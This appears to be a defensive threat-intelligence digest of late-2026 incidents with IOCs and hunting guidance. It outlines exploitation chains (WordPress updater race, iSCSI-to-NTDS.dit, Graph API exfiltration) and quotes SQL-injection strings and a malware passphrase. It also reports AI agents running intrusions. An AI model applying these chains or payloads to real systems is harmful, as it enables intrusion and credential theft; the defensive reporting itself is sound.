item.title: What happens when a fake coding test reaches a security company?
item.description:
North Korean 🇰🇵 fake-interview campaigns hit a security vendor: BeaverTail and InvisibleFerret deployed via a VS Code workspace lure, exposing a broken endpoint agent as the critical failure point.
Key details:
- The attack chain began with a GitHub "coding assignment" opened in VS Code. A command hidden in the workspace settings file executed the moment a terminal opened, delivering the BeaverTail loader and InvisibleFerret backdoor within two minutes. The first script dropped on the Mac was detected as Troj/Dloadr-EJE, but the endpoint agent was broken, so detection never fired. The Binance variant took a different path: attackers swapped the legitimate pyenv component inside a Homebrew installation for a malicious version, used it to beacon an attacker-controlled server, then cleaned traces. Both chains abused trusted developer tooling rather than exploit code.
- The compromised Mac was only discovered via an external tip through an intelligence-sharing channel, not internal controls. The root cause was mundane: the endpoint agent had stopped reporting. The vendor's existing device-compliance checks and coverage monitoring had a gap because they were not correlated with identity sign-in data. A device actively authenticating but silent in the endpoint console is a blind spot. Correlating those two data sources surfaced the gap. The full root cause analysis is published as INC-2026-002.
- Attribution from Sophos CTU points to NICKEL ALLEY (Contagious Interview), whose tradecraft matches the VS Code workspace technique, fake companies, malicious code repositories, ClickFix lures, and poisoned npm packages. NICKEL GLADSTONE, the financially focused subgroup, is FBI-linked to the Binance attack under the TraderTraitor label. A September joint advisory from Japan's 🇯🇵 National Police Agency and the FBI assessed that between December 2025 and July 2026, Contagious Interview (also named WaterPlum) compromised at least 30,000 devices across more than 100 countries and drained over 7,000 cryptocurrency wallets.
- Lateral movement at Binance used an internal AI tool to pivot from one engineer to two others, underscoring that AI-layer access needs the same containment thinking as any privileged service: credential isolation, sealed tool endpoints, and human approval gates for irreversible actions.
Practitioner takeaway: Pull every device that has authenticated to your identity provider in the last 30 days and cross-reference against your endpoint console's active device list. Any device that is signing in but not reporting is an unmonitored asset and your highest-priority coverage gap. For the VS Code lure specifically, audit workspace settings files (settings.json and tasks.json inside .vscode directories in any cloned repository) for terminal or task entries that run scripts on open. BeaverTail and InvisibleFerret are your hunt targets on macOS; look for unexpected child processes spawned from the VS Code helper process and outbound connections established within seconds of a terminal open event.

item.title: Application identity abuse targets MSPs and customer environments
item.description:
Application identity abuse targets MSPs-linked threat actor authenticates as trusted Azure apps, bypassing MFA entirely, to harvest credentials across multiple customer tenants in an ongoing campaign first observed November 1, 2026.
Key findings:
- The adversary authenticated directly to Microsoft Entra ID and Azure DevOps using valid application credentials, operating as trusted service principals rather than compromised users. Because application sign-ins carry no interactive session, MFA and user-focused Conditional Access policies do not apply, and on-premises firewalls have no visibility. All confirmed malicious activity originated from a single IP: 199.19.77[.]84, hosted in Poland 🇵🇱.
- Once authenticated, the operator retrieved stored secrets from Key Vault and other credential stores, then used MSP multi-tenant applications, Partner Center tokens, and Granular Delegated Admin Privileges (GDAP) applications to pivot across customer tenants. Previously dormant applications began authenticating within minutes of secret retrieval, confirming the operator moved laterally using freshly harvested credentials. Azure DevOps service connections and deployment pipelines were in scope, introducing risk to production infrastructure.
- The operator collected files containing credentials and configuration details for VPNs, RMM tools, backup platforms, and firewalls. Access to those downstream systems is the likely end goal, extending the breach well beyond the Microsoft cloud. Integration applications for security tooling, including Todyl's own MSP integration apps in two tenants, were among the credentials abused, with no evidence of vendor platform compromise.
- After detections fired on November 3, 2026, the adversary adapted: spoofing browser signatures, replaying users' refresh tokens, and retrying disabled and rotated application credentials in fixed 11-second loops. Conditional Access blocked every token replay observed that day, and error codes AADSTS7000215 and AADSTS7000222 appeared in logs alongside failed secret attempts followed by successful sign-ins, a detectable pattern.
Practitioner takeaway: Pull Entra ID service principal sign-in logs and filter for 199.19.77[.]84, then hunt for the sequence of AADSTS7000215 or AADSTS7000222 errors followed by a successful authentication, and for applications authenticating after extended inactivity. For confirmed exposure, remove all secrets, certificates, and federated credentials on affected service principals, check for credentials added without approval, and disable the principal. Already-issued tokens remain valid until expiry, so also revoke Azure DevOps PATs and SSH keys and rotate every downstream credential the application could reach: VPN, RMM, backup, and firewall. Block 199.19.77[.]84 via a Conditional Access named location policy scoped to workload identities and to user sessions covering token replay. IOCs and detailed mitigation steps are in the report.

item.title: CVE-2026-119977: When Updating WordPress Becomes the Vulnerability
item.description:
CVE-2026-119977 (CVSS 8.1): Unauthenticated RCE in WordPress core updater via race condition, actively exploited in the wild and added to CISA KEV on November 3, 2026. Fixed in WordPress 7.1.4.
Key findings:
- The race window opens between WordPress extracting a core update package into wp-content/upgrade/[package-name]/wordpress/ and copying it over the live site. The temporary setup-config.php does not search upward far enough to find the live wp-config.php, so it treats the staging tree as an unconfigured installation and runs the setup wizard without authentication. An attacker who wins the race can POST database credentials to that temporary installer, which writes a malicious wp-config.php into the staging tree at wp-content/upgrade/[package-name]/wordpress/wp-config.php. Because wp-config.php is absent from both the initial skip list and the checksum manifest, the updater copies it straight over /var/www/html/wp-config.php. The live site then connects to the attacker's empty database, re-exposes the install wizard, and an attacker-created administrator account can upload a PHP plugin for RCE.
- Exploitability depends on whether the staging path is predictable. WordPress 2.7.0-2.7.1 used the fixed path wp-content/upgrade/core. Versions 2.8.0-4.3.35 derived the directory name from the package filename with no random suffix, also predictable. Versions 4.4.0-5.8.18 added a six-character random suffix, making the path unpredictable unless disclosed through verbose errors or other means. Versions 5.9.0-7.1.3 reintroduced predictability by honoring the Content-Disposition filename from the package server, so a stable server-supplied name like wordpress-7.0.3[.]zip produces wp-content/upgrade/wordpress-7.0.3 deterministically.
- The 7.1.4 patch applies three changes: a 16-character random suffix is now added to the working directory name in class-wp-upgrader.php directly, so the Content-Disposition rename can no longer determine the path; upgrade/index.php is preserved across cleanups to block directory listing from leaking the random name on servers with indexing enabled; and wp-config.php is explicitly added to the skip list in update-core.php. However, the update that installs the fix is itself still partially exposed: unpack_package() runs from the old code and still creates a predictable staging path, so the temporary installer is still reachable during that one transition update. The new update-core.php does skip wp-config.php, so the live config cannot be overwritten during this window, but an attacker can still configure the temporary copy with their own database and execute PHP with web server privileges before the staging directory is cleaned up.
- Affected range is WordPress 2.7.0 through 7.1.3. The fix was backported to all maintained branches down to 4.7. Versions 2.7 through 4.6 received no backport and must be upgraded to a supported release. The wp core update WP-CLI command uses the same underlying updater and extracts into wp-content/upgrade/ identically, so it is not a safe substitute for a manual update during the transition.
DFIR and detection angle: Requests hitting setup-config.php under wp-content/upgrade/ are the clearest signal of exploitation in progress. Web server access logs are your primary evidence source. Look for POST requests to paths matching /wp-content/upgrade/*/wordpress/wp-admin/setup-config.php originating from unexpected source IPs during or shortly after a core update event. A modified wp-config.php timestamp that postdates the update start time but predates the update completion is a strong indicator of successful config replacement. If you suspect compromise, compare the DB_HOST, DB_NAME, and DB_USER values in the live wp-config.php against your known configuration. As an immediate mitigation before patching, block web access to wp-content/upgrade/ at the server level: on Nginx with "location ^~ /wp-content/upgrade/ { deny all; }" or on Apache with "Require all denied" in the Directory block. Confirm the path returns 403 before triggering any update. For the safest transition to 7.1.4, extract the release to /tmp outside the web root and rsync wp-admin and wp-includes into place while explicitly excluding wp-config.php and wp-content, then run wp-admin/upgrade.php to complete database updates.

item.title: How Cortex AES Protects Against Compromised Claude Code Extensions
item.description:
Malicious versions of the Claude Code VS Code extension were distributed through Cursor's marketplace for 11 hours, exposing up to 5,000 developers to a supply chain attack carrying reconnaissance, persistence, and SSH backdoor capabilities.
Key details:
- Compromised versions 2.1.312 and 2.1.313 of anthropic.claude-code were pushed through Cursor's Open VSX-mirrored marketplace on October 29, 2026, targeting macOS and Windows. The malicious payload lived inside the extension's extension.js bundle (SHA-256: ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15) and was not authored by Anthropic. The root cause traces to a vulnerability in Open VSX's publisher verification and namespace management that allowed full marketplace account takeover, meaning a poisoned update could reach developers without triggering standard trust warnings.
- Once loaded, the extension ran host reconnaissance: collecting OS details, usernames, working directories, public IP addresses, and environment variable names, then beaconing to 134.209.82[.]225:8099/beacon over HTTP. It also attempted to inject an unauthorized SSH public key (comment: svc-telemetry, fingerprint SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk) into authorized_keys and open a reverse SSH tunnel to that same C2 over TCP port 22.
- Persistence was attempted via a macOS LaunchAgent (com[.]apple.sysmond.plist) and a Windows scheduled task named SysMon, with supporting artifacts at .config/.smt and .config/smt.cmd. Errors in the payload and lack of admin privileges generally prevented the SSH backdoor from going fully operational, but persistence mechanisms and telemetry transmission could still succeed even without elevated rights.
- The attacker-controlled infrastructure at 134.209.82[.]225 is now offline and the compromised versions have been pulled, but any endpoint that loaded these versions during the 11-hour window should be treated as potentially implanted. Developer systems routinely hold source-control tokens, cloud keys, registry credentials, and active sessions, making credential exposure the most consequential downstream risk here.
Responder action: audit installed extension versions across developer endpoints and flag any system that had anthropic.claude-code 2.1.312 or 2.1.313 active between October 29 and 30, 2026. On those hosts, hunt for the svc-telemetry authorized_keys entry, com[.]apple.sysmond.plist, the SysMon scheduled task, and the .config/smt.cmd artifact. Check endpoint and network telemetry for outbound connections to 134.209.82[.]225. Isolate any host showing evidence of payload execution, strip all malicious artifacts, and rotate every credential class accessible from that environment from a clean host. Full platform-specific verification commands and remediation scripts are in Cursor's official security notice.

item.title: Mi Scusi, My SCSI: Abusing iSCSI Target Server
item.description:
Unauthenticated iSCSI target abuse lets an attacker impersonate a legitimate initiator, mount virtual hard disks over the network, and walk away with NTDS.dit and credential hives, bypassing NTFS entirely.
Key findings:
- Discovery starts with a simple LDAP query: when the Windows iSCSI Target Server service starts, it registers an SPN on the host computer's AD account, handing attackers a ready-made list of targets. Initiator IQNs are equally predictable, constructed from the dNSHostName attribute of domain-joined computers in the format iqn.1991-05[.]com[.]microsoft:hostname.domain. No rate limiting or brute-force protection exists on the service, so iterating through AD or DNS computer names is cheap.
- Without CHAP configured, the iSCSI Login Phase requires only three things: the target server's address, its target IQN, and a recognized initiator IQN. The target IQN is recoverable via an unauthenticated Discovery session using the SendTargets operation, which the RFC mandates the server answer with every IQN the querying initiator can access. The tool scuzzy[.]py automates this enumeration and login sequence.
- Because iSCSI operates at block level, a successful connection bypasses NTFS permissions entirely. An attacker who mounts the volume can browse the file system as if seated at the storage layer, including the $RECYCLE.BIN directory, which leaks SIDs of users who had interactive logons on hosts that previously mounted the volume.
- The worst-case path lands domain compromise in a single chain: enumerate SPN in AD, brute-force initiator IQNs, run a Discovery session to recover the target IQN, login, download the .VHDX of a Hyper-V VM that happens to be a domain controller, mount it with adiskreader, and extract SAM, SYSTEM, SECURITY, and NTDS.dit from C:\Windows\System32\config and C:\Windows\NTDS, then run Impacket's secretsdump[.]py against the recovered files. BitLocker or equivalent encryption breaks this chain; absent that, the drive is an open book.
- SpecterOps queried BloodHound Enterprise customer tenants and found roughly 50% had at least one computer with the iSCSI target SPN registered, with one tenant showing close to 700 such hosts. Common payloads on these drives include clustered Hyper-V VMs, MSSQL, Exchange DAGs, and third-party backup data.
Hunt: query AD for SPNs containing "MicrosoftInternetSCSITarget" or the equivalent host-class SPN the service registers to map your exposure. For hosts that show up, audit the iSCSI target configuration for CHAP enforcement and check whether the access server list contains any broad or wildcard initiator entries. Network captures on TCP port 3260 showing Discovery session traffic from unexpected initiators are your canary. Enable CHAP authentication, enforce IPsec for iSCSI traffic to prevent credential sniffing, and use host-based firewall rules to restrict TCP 3260 to known initiator IPs rather than relying on IQN identity alone.

item.title: Leveraging Microsoft Graph API Change Notifications for Data Exfiltration
item.description:
Microsoft Graph API Rich Notifications abused for stealthy M365 data exfiltration: Teams messages and Outlook email content tunneled to attacker-controlled webhooks through Microsoft's own infrastructure, bypassing traditional DLP controls in post-exploitation scenarios.
NetSPI's research published today details how the Graph Change Notifications feature, specifically Rich Notifications with includeResourceData set to true, can be turned into a persistent data exfiltration channel after a user or service principal is compromised. The data delivery happens entirely through Microsoft's infrastructure, not direct attacker connections to the mailbox or chat, which is what makes this so difficult to detect with conventional monitoring.
- An attacker with a compromised access token (obtainable via device code phishing using roadtx against the Microsoft Office app client ID d3590ed6-52b3-4102-aeff-aad2292ab01c, which carries pre-consented delegated Graph scopes) submits a POST to graph[.]microsoft[.]com/beta/subscriptions with includeResourceData: true and an attacker-controlled encryptionCertificate. Once registered, Microsoft pushes encrypted Rich Notifications to the attacker's webhook endpoint on every email or Teams message create, update, or delete event. The attacker never touches the inbox or chat directly after that point.
- Subscription lifetimes are enforced by the backend: Rich Notifications for Outlook messages cap at 1,440 minutes (roughly one day) and Teams messages at 4,320 minutes (three days). An attacker with persistent token access can renew subscriptions before expiry via the PATCH update API, keeping the channel alive indefinitely. The Outlook body field is restricted to the bodyPreview (255 characters), but the report demonstrates a bypass: saving chunked content as draft emails triggers update notifications, reassembling the full content server-side at the webhook.
- For application scenarios, a compromised service principal holding Chat[.]Read.All with admin consent and the resource /chats/getAllMessages receives full Teams message bodies from every conversation across the entire tenant, not just one user. The report walks through a "Message Archiver" app scenario where both Test Test and User Test messages hit the attacker's Cosmos DB within seconds of being sent, with no interaction required from the target users.
- The Entra Admin Portal has no blade for reviewing active subscriptions. A Global Administrator with Subscription[.]Read.All must run Get-MgSubscription to enumerate them. Key fields to review per subscription are ApplicationId (which app was used to create it), IncludeResourceData (Rich Notification flag), NotificationUrl (attacker webhook), Resource (what data is flowing), and CreatorId (the principal that registered it). Jos Lieben's M365Permissions tool also enumerates subscriptions.
- Two log sources are relevant for detection. MicrosoftGraphActivityLogs captures create, read, update, and delete calls to the /subscriptions endpoint but does not log webhook trigger events. The KQL starting point is: MicrosoftGraphActivityLogs | where TimeGenerated > ago(30d) | where RequestUri has_any ("/v1.0/subscriptions", "/beta/subscriptions"). The new GraphNotificationsActivityLogs table, added after MSRC engagement, logs every triggered notification including the webhook endpoint, subscription type, and ApplicationId. Correlate SubscriptionIdentity across both tables and against Get-MgSubscription output to reconstruct the full picture: who created it, what resource it watched, and how many times it fired.
Practitioner action: run Get-MgSubscription -All now and audit every entry where IncludeResourceData is True and NotificationUrl points outside your tenant's known infrastructure. Then alert on MicrosoftGraphActivityLogs for POST requests to /subscriptions and correlate with GraphNotificationsActivityLogs by SubscriptionIdentity. KQL samples for both tables are in the report. To reduce exposure, enforce Conditional Access to block device code authentication flows, which is the initial access vector demonstrated here.

item.title: Binance heist: what we know, and what RL sees in TraderTraitor's toolkit
item.description:
FBI-attributed North Korean 🇰🇵 TraderTraitor operation stole ~$6.34B from Binance via a trojanized Terraform provider. ReversingLabs telemetry caught key malware 77 days before public disclosure.
- The attack chain began with a fake job interview repository containing a weaponized .terraform.lock.hcl file pointing at the lookalike registry.hashicorp-terraform[.]io. When the developer ran terraform init, it pulled terraform-provider-awsbeta_v1.0.0 (SHA-256 188bd4fc222c9615540884920caf37ea88bcbea7488e1fb98709e357dd096666), classified MacOS.Trojan.Multiverze, first seen by RL on July 23, 2026, 77 days before Zscaler's public write-up. Only 7 of 24 scanners flagged it, and RHA similarity placed it among 16 legitimate Terraform provider builds: the malicious binary is structurally almost identical to the real thing because it IS the real thing with a small malicious package compiled in.
- The provider drops safari_updater (SHA-256 451b586ec9d3c997b319986a1177829653e8ae641c953c05ede6a38616f2da97), a Bash loader that fetches a font-disguised payload from supportaru.serveftp[.]com, a GitHub mirror, or stage-fashion365.vercel[.]app. The .woff file hides an AES-256-CBC encrypted executable after an @@ENDFONT@@ marker, decrypted with the hardcoded passphrase PTa3WZPQZAjj55t@. The decrypted result is FLATROOF, a Rust backdoor (SHA-256 3c254614de8c1a2f213c526b0e5072d43ffeb7cc340d9a4a6ebaa16592b3bbe0, RL: MacOS.Trojan.Gaslight) that persists via a ~/.zlogout hook, runs Python credential stealers targeting browser cookies, keychain, and shell history, and then installs ROOFDECK. The payload launches with --type=renderer to impersonate a Chromium renderer process. The self-delete line in the loader is commented out: the script stays on disk.
- ROOFDECK's history is the most operationally significant finding. The macOS variant imagent (SHA-1 93c655963d7dd6cac017d9a59f54f7cee196fc89, MacOS.Backdoor.GetShell) arrived in RL telemetry in the same 13-minute window as the provider. RHA pivots found two earlier macOS siblings not in any published IOC list: SHA-1 20e541a41fc8b0e201c7d26a66bbfd1d078f61b3 (first seen May 22, 2026) and SHA-1 5728b11d30586bbfc1d8bd12df1c722a06e767a2 (first seen July 13, 2026), both MacOS.Exploit.ReverseShell, 4.7 MB, TLSH differing by at most 4 of 72 characters. The Windows ROOFDECK update.exe (SHA-1 0b7ca6630ea1e66b7d96f3adf2a3e25b08fc1e92, Win64.Trojan.ReverseShell) was first seen by RL on September 9, 2025, ten months before reported discovery, circulating under submitter names linking it to Akira and RustyStealer. None of these files carry a TraderTraitor or Lazarus threat name. Telemetry searches on those labels find nothing.
- Network detection is thin: registry.hashicorp-terraform[.]io has 0 of 49 vendors flagging it, diagnose.hashicorp-terraform[.]io has 5 of 48, and supportaru.serveftp[.]com has 2 of 49. A .terraform.lock.hcl pinning providers to any non-HashiCorp registry is a stronger detection signal than any reputation score. ROOFDECK resolves its C2 via a Nostr profile to a Pastebin dead drop (hxxps://pastebin[.]com/raw/3yptBDhL) and then delay.servehttp[.]com. The shared on-chain artifact between Binance and Bitget proceeds is ETH address 0x15104a9ce0f08a8f0075a0869ae80e795fe0feb7.
- The YARA rule RL_TraderTraitor_FlatroofFontContainer_2026 targets the @@ENDFONT@@ marker plus a 512-character Base64 run in a valid WOFF file. A companion Sigma rule, id 4f2a9c61-8b3e-4d7a-9e15-2c6d0b7f3a18, detects a terraform-provider-* process spawning sh, bash, curl, openssl, xattr, or codesign on macOS. A retro hunt on October 31 found two additional WOFF files (SHA-256 76ec916464baf025c9573f78fc413f5eab0d03f4ada6cd247671f0f4ab4fbcae and 1f96fc738fecc8e137244b5c3d0890ba2e618c57975478716bf20848eecda1e0, both first seen October 9, 0 of 38 scanners) assessed as likely additional FLATROOF containers not in any public IOC list.
Hunt your Terraform build hosts and CI runners: check for session.lock run-once markers, processes named imagent or SystemUpdate outside Apple paths, ~/.zlogout modifications, and $HOME/Library/com.apple.iTunesCloud/SystemUpdate on macOS or HOME/AppData/Local/Microsoft/Edge/service.exe on Windows. Flag any .terraform.lock.hcl referencing a non-hashicorp[.]com registry. Full IOC table, YARA rules, and the Sigma rule are in the ReversingLabs GitHub repository linked in the report.

item.title: 3AM Ransomware Used Human-AI Hybrid Tactics in UK School Estate Compromise
item.description:
3AM ransomware affiliate used a human-AI hybrid operation to compromise a UK 🇬🇧 school estate, encrypting 37 machines after building cross-domain trust across the network over nine days in September 2026.
Key findings:
- Bitdefender attributes this to a 3AM ransomware affiliate operating under a RaaS model, with the Rust-based 3AM encryptor first observed in February 2023. Initial access vector was not determined. The first confirmed activity on September 10 was credential theft from backup infrastructure, with decryption performed using the Windows Data Protection API, a native OS feature that made the action blend into normal behavior.
- The hybrid human-AI methodology is visible in the command timing. During lateral movement attempts on September 12-13, PowerShell commands were reissued unchanged 41 seconds after first run, then modified 49 seconds later, then replaced entirely with wmic at the same speed. Bitdefender assesses that the rapid full rewrites, arriving as fast as minor edits, indicate an AI agent handling retries, while the longer 2-16 minute gaps between distinct tasks reflect a human reading output and choosing the next step. SQL Server was the parent process for WMI-based lateral movement using stolen administrator credentials.
- On September 14, the attacker ran Mimikatz for credential dumping, created two backdoor domain administrator accounts via separate routes, and exfiltrated approximately 40 financial files using Windows robocopy before sending them to C2 via HTTP POST. Bitdefender specifically flags the registry-as-transport channel used in exfiltration as an unusual choice and a strong indicator to hunt for.
- On September 19, the attacker joined three separate Active Directory domains using two-way trusts within roughly a three-hour window, expanding access to 50 machines from a single unmanaged host. The trust-building phase, which is mechanical and error-sensitive, is described as the clearest example of the hybrid approach: an AI model handling repetitive configuration steps while a human interpreted errors and directed corrections. The attacker then attempted EDR removal before encrypting 37 of the 50 reachable machines.
- Bitdefender calls this the first documented case of a human-AI hybrid ransomware attack in Europe and assesses the model is economically rational for threat actors, with AI absorbing the repetitive mechanical work at no additional skill cost. The researchers assess hybrid attacks of this type will become more common in 2027.
Takeaway: Hunt for WMI lateral movement with SQL Server as parent process, robocopy usage copying financial files in bulk, creation of new domain administrator accounts via multiple routes on the same day, and cross-domain trust creation activity in a compressed timeframe. Treat backup infrastructure credential stores as primary targets during triage, audit privileged accounts across all domains for unexpected additions, and review whether unmanaged hosts have endpoint agents, the attack pivoted to 50 machines from a single unmanaged endpoint. The full Bitdefender report contains the detailed timeline and defensive recommendations.

item.title: Artex in the wild: Lessons from responding to agentic AI attacks
item.description:
Agentic AI framework Artex hit multiple organisations in October 2026, moving from web server foothold to full identity and cloud compromise in as little as four hours, with self-annotating artifacts that now give responders concrete forensic footholds.
Key findings:
- Artex is an open-source-turned-private agentic AI penetration testing framework that orchestrates conventional security tools through agents that interpret results and autonomously determine next steps. Initial access came from exploiting vulnerable web server plugins or misconfigured upload functions, after which agents extracted credentials and broke outward to management planes and cloud systems. In one intrusion, agents went from initial access to compromising all identity infrastructure, cloud systems, source code, and perimeter firewalls in 24 hours. In another, they pivoted from a web server to central management platforms across a sprawling network in four hours. The ability to run two or three attack chains in parallel meant that while defenders were responding to one compromise, agents were already active elsewhere.
- Attribution to Artex specifically rests on a cluster of artifacts responders can hunt directly. Tools, scripts, VMs, keys, and accounts were tagged with the pattern "i<number>" matching Artex's documented task folder structure tasks/<taskID>/i<intentID>/. Task folders appeared on compromised hosts at the path /opt/artex/data/task/<task number>/i4028/[DC1] i4028.asp. SQL intrusions left strings such as "ARTEX' UNION SELECT 1--" and "ARTEX'//AND//2>1--" in query logs. Disposable GitHub branches were titled "artex-wtest-<number>" with readme files containing "probe". Placeholder emails followed the patterns <taskID>[@]example.invalid and <taskname>artex<intentID>[@]example[.]com. One incident revealed a threat actor IP serving a Next.js application titled "ARTEX - Autonomous pentest console" with a self-signed TLS certificate bearing subject and issuer fields C=CN, O=ARTEX. The norma/0.4 user agent, documented in Artex's own repo as its web-fetch SDK agent, also appeared alongside curl and Python user agents.
- Motives varied across the incidents. In one case, blocking an IP caused Artex to pivot within 10 minutes to TOR exit nodes and VPS infrastructure across 50 or more IP addresses, making IP-based blocks ineffective as a primary control. Agents regained access three separate times after containment rounds in another incident, finding new ingress routes each time. Containment and recovery planning needs pre-approved authorisation frameworks so network isolation and credential resets can be executed without approval delays, and plans must account for a more persistent and faster threat actor than any human operator.
Practitioner takeaway: Hunt for Artex artifacts now before you are mid-incident. item.title: ESET uncovers Gorbag cyberespionage campaign targeting Ukraine’s administrations, defense sector, transportation hub
item.description:
Russia-aligned threat actor "Gorbag" runs targeted cyberespionage against Ukrainian 🇺🇦 law enforcement, local administrations, defense, and foreign military aid infrastructure, operating as a likely initial access broker since at least February 2025.
Key details:
- Gorbag's toolset centers on two components: Prime ReverseShell, a PowerShell reverse shell compiled into a .NET binary using PS2EXE and derived from the public PSSW100AVB GitHub repository, and BeautyStealer, a C++ infostealer tracked from version 0.9 through 2.0 that harvests browser cookies and stored passwords from Chrome, Edge, Opera, and Firefox, OpenVPN configurations, and files (Office documents, archives, emails, VPN configs) from Desktop, Documents, Downloads, removable media, and mapped network drives. Stolen data is compressed and exfiltrated to an attacker-controlled Telegram chat or, from version 1.2 onward, a custom C2 server. BeautyStealer then self-deletes, leaving minimal post-execution trace on disk.
- Initial access through 2025 relied on spearphishing with macro-enabled .xlsm attachments themed around administrative fines or taxes. If macros ran, a VBA routine decoded a base64 payload hidden in spreadsheet cells, dropped it into %ProgramData%, and executed BeautyStealer. In at least one confirmed case, the sending account belonged to a compromised Ukrainian 🇺🇦 local government entity, lending the lure extra credibility. In early 2026 the delivery chain shifted to weaponized RAR archives exploiting CVE-2025-8088, a WinRAR path traversal flaw. On vulnerable systems the archive displays a decoy PDF while dropping a LNK file into the Windows Startup folder and placing an encrypted payload plus a PowerShell loader in %ProgramData%. The LNK provides persistence across reboots, the only persistent foothold the group maintains.
- Targeting maps directly to Russian 🇷🇺 wartime intelligence priorities. Roughly a quarter of victims are Ukrainian 🇺🇦 law enforcement and justice entities, a sector Russia-aligned groups linked to the GRU and FSB have pursued since at least 2023 to monitor war-crimes documentation and prosecutions. Another quarter are city councils near the front line, plausible sources of confidential battle damage assessment data and local defense initiative visibility. The remainder includes defense-sector organizations and a publicly documented transit hub for foreign military aid, itself a prior target of Russian 🇷🇺 air strikes.
- The group's operational signature is speed and cleanup, not persistence. Intelligence is collected in a single pass and the malware removes itself. Prime ReverseShell has not been observed since BeautyStealer was developed, suggesting a deliberate evolution toward a leaner, lower-dwell-time profile. ESET assesses Gorbag may function as an initial access broker, passing harvested credentials and VPN configurations to other Russia-aligned actors for follow-on intrusions whose later stages have not yet been observed. One BeautyStealer sample contained the unusual extension .bwetyutgvy on a collected file, almost certainly a developer test artifact.
Practitioner takeaway: The self-deletion behavior makes post-execution disk forensics difficult, so prioritize volatile and near-real-time sources. Hunt %ProgramData% for recently dropped executables and PowerShell loader scripts, and check the Windows Startup folder for unexpected LNK files, the persistence mechanism introduced with the CVE-2025-8088 chain. Browser credential store access (Login Data, Cookies, Local State) and OpenVPN config reads in rapid succession are a behavioral signal worth alerting on. For CVE-2025-8088, audit WinRAR versions across the environment and treat any unpatched host that handled RAR files since early 2026 as potentially compromised. Because exfiltration runs over Telegram or a custom C2 before cleanup, Telegram API egress from endpoints and anomalous outbound connections from %ProgramData%-resident processes are the best network-layer indicators to pursue.

item.title: China-Aligned Hackers Hijack Sogou Input Method DNS Requests to Deploy DarkVigil Backdoor
item.description:
Chinese-aligned SlippyNunchucks hijacks Sogou Input Method DNS to deploy DarkVigil backdoor, targeting Chinese-speaking individuals across Asia and Europe in an active surveillance campaign since July 2026.
Key details:
- SlippyNunchucks, active since at least September 15, 2023, abuses insecure HTTP in the Windows version of Sogou Input Method (a Tencent product) by tampering with DNS resolution for config.pinyin.sogou[.]com/api/brandScd/getBrandScd.php. Hijacked requests resolve to staging servers at 47.239.250[.]102 (sogou-cdn[.]com) or 47.237.122[.]175 (dev.soft-png-cdn[.]com), which return a malicious configuration in place of the legitimate branded vocabulary payload.
- The malicious config instructs the legitimate Sogou component SGTool.exe to download two files from sogou-cdn[.]com: a clean Adobe executable (biz_helper.exe) and a rogue DLL (libcef.dll) carrying DarkVigil. Execution is achieved through DLL sideloading, keeping the malicious code running under a trusted binary's identity.
- DarkVigil (also tracked as FDMTP) uses the Duplex Message Transport Protocol (DMTP) for C2, pulling and orchestrating a modular plugin set of over 20 components for persistence and data collection. The actor previously delivered DarkVigil via a supply chain compromise of the QuickFox VPN, pivoting to the Sogou vector within three days of QuickFox releasing a clean build, showing deliberate operational agility.
- Targets span Hong Kong, Thailand 🇹🇭, Japan 🇯🇵, Vietnam 🇻🇳, Oman, and Sri Lanka 🇱🇰, with notable surveillance of organizations running Chinese-language online betting platforms, a focus consistent with Chinese 🇨🇳 government interest in extraterritorial gambling activity. ESET assessed this as a nation-state surveillance effort and treats SlippyNunchucks as a distinct intrusion set from Mustang Panda despite DarkVigil overlaps.
- Tencent patched CVE-2026-120422 in Sogou Input Method version 16.10 (released October 29, 2026) by migrating the affected HTTP requests to HTTPS. Separately, CVE-2026-51990, a distinct Sogou vulnerability chaining protocol handler injection, an unsandboxed CEF WebView, and the old Chromium engine flaw CVE-2021-38003, was exploited by UNC3569 to deliver the GRAYRABBIT backdoor and was patched earlier.
Hunt for SGTool.exe spawning unexpected child processes or loading unsigned DLLs named libcef.dll from non-standard paths. DNS query logs showing the Sogou config domain resolving to any IP other than Tencent's production infrastructure, particularly those two staging IPs, are a strong compromise signal. Review network traffic for DMTP-based C2 patterns on hosts running Chinese-language IME software. IOCs and analysis detail are in the ESET report.

item.title: Poisoned cPGuard update hits thousands of web hosting servers
item.description:
Supply chain attack on cPGuard's update infrastructure pushed a credential-harvesting root shell script to ~2,950 Linux web hosting servers in a 70-minute window, with attacker access confirmed on some servers by hand.
Key details:
- The malicious payload, delivered as cPGuard versions 5.88.12 through 5.88.19 between 02:04 and 02:09 UTC on November 2, 2026, was a short script that ran as root and exfiltrated password hashes, root SSH keys, MySQL root passwords, root shell history (which may contain plaintext credentials and tokens), and cloud storage keys to an attacker-controlled staging point. It then planted a hidden root shell at /var/tmp/.cpg91511_sh with supporting files under /var/tmp/.i93677/, and created a scheduled task (the i93677 task) for persistence.
- The attacker's reconnaissance started roughly ten hours before the first malicious update: they registered a free trial account to study how the cPGuard agent communicates with OPSShield's licensing system, then sent crafted requests to billing portal callback pages to achieve remote code execution on the billing and licensing server. That pivot gave them approximately 7,900 customer records (name, company, postal address, email, and bcrypt-hashed passwords) and, eventually, the update-storage key used to push the fake builds.
- Three cloud server snapshots were also cloned by the attacker, meaning infrastructure state at the time of compromise may be in hostile hands. OPSShield has not yet identified the exact request that gave the attacker command execution on the billing server, so the initial web application entry point remains partially unconfirmed, though two suspected code paths have been patched.
- Exposure is scoped by the update polling window: servers that were offline or did not check for updates between roughly 02:04 and approximately 03:15 UTC on November 2 did not receive the malicious build. For servers confirmed to have been accessed interactively by the attacker, OPSShield is recommending a full rebuild from a clean backup predating November 1.
- OPSShield has published an IOC list (including indicators found on their own infrastructure) and released clean update v5.88.26, which removes the hidden shell and the i93677 scheduled task.
For responders on affected servers: start by confirming whether versions 5.88.12 through 5.88.19 were ever installed, then check for /var/tmp/.cpg91511_sh and the /var/tmp/.i93677/ directory. Audit cron and scheduled tasks for the i93677 entry. Review /root/.ssh/authorized_keys for unrecognized public keys, check root shell history for credential exposure, audit outbound connections made during the compromise window, and enumerate local accounts and running services for anything unfamiliar. Any credential class touched by root on these servers (database passwords, S3 keys, DigitalOcean tokens, keys in /root/.s3cfg, and anything in shell history) should be treated as compromised and rotated from a trusted environment. IOCs are in OPSShield's published report.

item.title: Inside ARTEX: AI-Powered Intrusions, Cloud Compromise, and Cyber Espionage
item.description:
